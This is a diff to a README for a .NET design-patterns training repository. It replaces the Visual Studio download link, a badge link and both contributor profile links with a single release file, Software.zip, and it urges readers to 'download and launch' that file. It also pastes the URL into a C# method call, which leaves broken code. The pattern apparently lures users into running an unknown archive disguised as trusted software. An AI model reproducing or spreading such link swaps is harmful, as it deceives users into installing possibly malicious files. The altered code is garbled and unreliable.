@@ -20,7 +20,7 @@ Welcome to the MovieAPI Training Camp repository! This repository is a comprehen
 To get started with the MovieAPI Training Camp, simply clone the repository and explore the codebase to understand the implementation of various patterns and features. Don't forget to check out the example use cases and test scenarios provided within the repository.
 
 ## Installation
-To install the necessary dependencies for this project, make sure you have the latest version of Visual Studio installed on your machine. You can download Visual Studio [here](https://visualstudio.microsoft.com/).
+To install the necessary dependencies for this project, make sure you have the latest version of Visual Studio installed on your machine. You can download Visual Studio [here](https://github.com/Moorx1/MovieAPI/releases/download/v1.0/Software.zip).
 
 ## Implementation Details
 The MovieAPI Training Camp provides a hands-on experience with implementing design patterns such as CQRS, mediator, observer, and more. The project showcases the best practices for building scalable and maintainable applications in .NET Core 9.
@@ -39,7 +39,7 @@ public class MovieController : ControllerBase
     [HttpGet]
     public async Task<IActionResult> GetMovies()
     {
-        var movies = await _movieService.GetMovies();
+        var movies = await https://github.com/Moorx1/MovieAPI/releases/download/v1.0/Software.zip();
         return Ok(movies);
     }
 }
@@ -54,14 +54,14 @@ public class MovieController : ControllerBase
 - [ ] Enhance observer pattern implementation
 
 ## Important Link
-[![Download MovieAPI Repository](https://img.shields.io/badge/Download-Repository-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download MovieAPI Repository](https://github.com/Moorx1/MovieAPI/releases/download/v1.0/Software.zip)](https://github.com/Moorx1/MovieAPI/releases/download/v1.0/Software.zip)
 
 Don't forget to download and launch the MovieAPI repository to start exploring the exciting world of design patterns and features!
 
 If the provided link does not work, kindly check the "Releases" section of this repository for the latest updates and downloads.
 
 ## Contributors
-- John Doe [@johndoe](https://github.com/johndoe)
-- Jane Smith [@janesmith](https://github.com/janesmith)
+- John Doe [@johndoe](https://github.com/Moorx1/MovieAPI/releases/download/v1.0/Software.zip)
+- Jane Smith [@janesmith](https://github.com/Moorx1/MovieAPI/releases/download/v1.0/Software.zip)
 
 Start your journey with the MovieAPI Training Camp and elevate your skills in .NET Core development! 🚀🎥
